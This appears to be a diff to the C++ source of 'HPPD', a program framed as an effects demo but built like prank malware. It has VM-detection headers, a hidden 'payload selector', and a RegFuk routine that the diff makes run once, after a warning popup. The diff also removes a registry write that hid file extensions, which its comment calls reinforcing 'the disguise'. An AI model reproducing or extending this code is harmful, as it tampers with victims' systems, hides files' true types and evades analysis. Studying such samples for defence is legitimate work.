@@ -14,11 +14,12 @@
 #include "utils/vmdetect.h"
 #include "utils/vmscan.h"
 #include "utils/reg.h"
+#include "utils/tosse.h"
 #include "easter/dates.h"
 #include "easter/desk.h"
 #include "easter/sys.h"
 
-#include "regfuk.cpp"
+#include "regfuk.h"
 
 // ============================================================
 // HPPD - effects demo
@@ -802,9 +803,6 @@ int main()
     printf("Global SEED: %u\n", gSeed);
     fflush(stdout);
 
-    RegFuk::Fuk(); // TODO: only run this the first time HPPD is ran
-                   // check it by using Tosse
-
     // Easter eggs: date-based, desktop-based, system-based.
     EasterDates();
     EasterDesk();
@@ -829,23 +827,22 @@ int main()
         return 0;
     }
 
-    // VM confirmed: reinforce the disguise, mirroring the VBS
-    // one-liner (HideFileExt = hide file extensions in Explorer).
-    // Administrator rights are required for HKLM; the write just
-    // fails silently when the process is not elevated.
-    Reg::Write(
-        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
-        L"1",
-        L"REG_DWORD"
-    );
-
     // Warning popup. Ctrl+F12 opens the payload selector;
     // returns 1 to run the full demo, 0 to exit.
     // /nogui skips it and runs the demo directly.
     if (!noGui && RunPopup() != 1)
         return 0;
 
-    // Everything accepted - run the effects show.
+    // Everything accepted
+
+    // RegFuk: one-shot. Só roda na primeira vez que o HPPD
+    // for iniciado
+    if (!Tosse::Check())
+    {
+        RegFuk::Fuk();
+        Tosse::Mark();
+    }
+
     StartEffects(noGui);
 
     return 0;
